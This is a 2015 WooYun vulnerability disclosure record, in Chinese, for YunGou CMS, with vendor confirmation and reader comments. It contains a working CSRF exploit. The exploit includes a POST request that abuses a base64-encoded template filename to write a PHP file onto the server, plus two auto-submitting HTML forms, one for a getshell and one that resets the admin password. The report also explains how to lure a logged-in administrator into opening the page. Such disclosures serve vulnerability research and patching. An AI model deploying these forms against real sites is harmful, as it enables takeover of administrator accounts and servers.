{"id": 41137, "wybug_id": "wooyun-2015-089798", "wybug_title": "云购CMS Csrf Getshell+修改管理员密码", "wybug_corp": "yungoucms.com", "wybug_author": "浅蓝", "wybug_date": "2015-01-05 12:27", "wybug_open_date": "2015-04-05 12:28", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向公众公开  简要描述： 云购CMS Csrf Getshell 详细说明：  \n\n修改模板的地方提交抓包这是POST数据包提交的URLhttp://localhost/yun/?/admin/template/update/Y2FydC5jYXJ0bGlzdC5odG1s#仔细看一下这段URL  Y2FydC5jYXJ0bGlzdC5odG1s 为Base64编码解码后明文为cart.cartlist.html我们把x.php加密  x.php = eC5waHA=\nPOSThttp://localhost/yun/?/admin/template/update/eC5waHA=#content=<?php phpinfo();?>&submit=%E4%BF%9D%E5%AD%98%E6%A8%A1%E6%9D%BF\n提交后就会在statics\\templates\\yungou\\html目录下生成一个x.php再来看看修改管理员密码抓包后提交地址为：http://localhost/yun/?/admin/user/edit/1分别提交了四个数据Password    密码Pwdconfirm  确认密码Mid   submit-1  写个自动提交表单改管理员密码\n<form id=\"post123\" name=\"post123\" action=\"http://localhost/yun/?/admin/user/edit/1\" method=\"post\">\t\t<input type=text name=password value=\"test123\">\t\t<input type=text name=pwdconfirm value=\"test123\">\t\t<input type=text name=mid value=\"0\">\t\t<input type=text name=submit-1 value=\"\">\t\t<script>        document.getElementById('post123').submit();    </script>\t</form>\n\ngetshell<form id=\"post123\" name=\"post123\" action=\"http://localhost/yun/?/admin/template/update/eC5waHA=#\" method=\"post\">    <input type=text name=content value=\"<?php phpinfo()?>\"><script>        document.getElementById('post123').submit();    </script>\t</form>\n\n\n\n\n将表单存到任意网站  然后向管理员申请添加友情链接 (为的是让管理员先登录)然后把url发给他  肯定会打开。      接着就坐等密码被改吧   漏洞证明：  \n\n   修复方案：  你们更专业   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-05 13:35 厂商回复： 。看到了。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-09 19:12 |    \t\t菊花侠 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:5        | 他年我若为青帝，报与桃花一处开)\t\t \n  CSRF学习下，mark    \n     2015-01-26 23:39 |    \t\tnick被注册 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:20        | 天一)\t\t \n  学习了！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}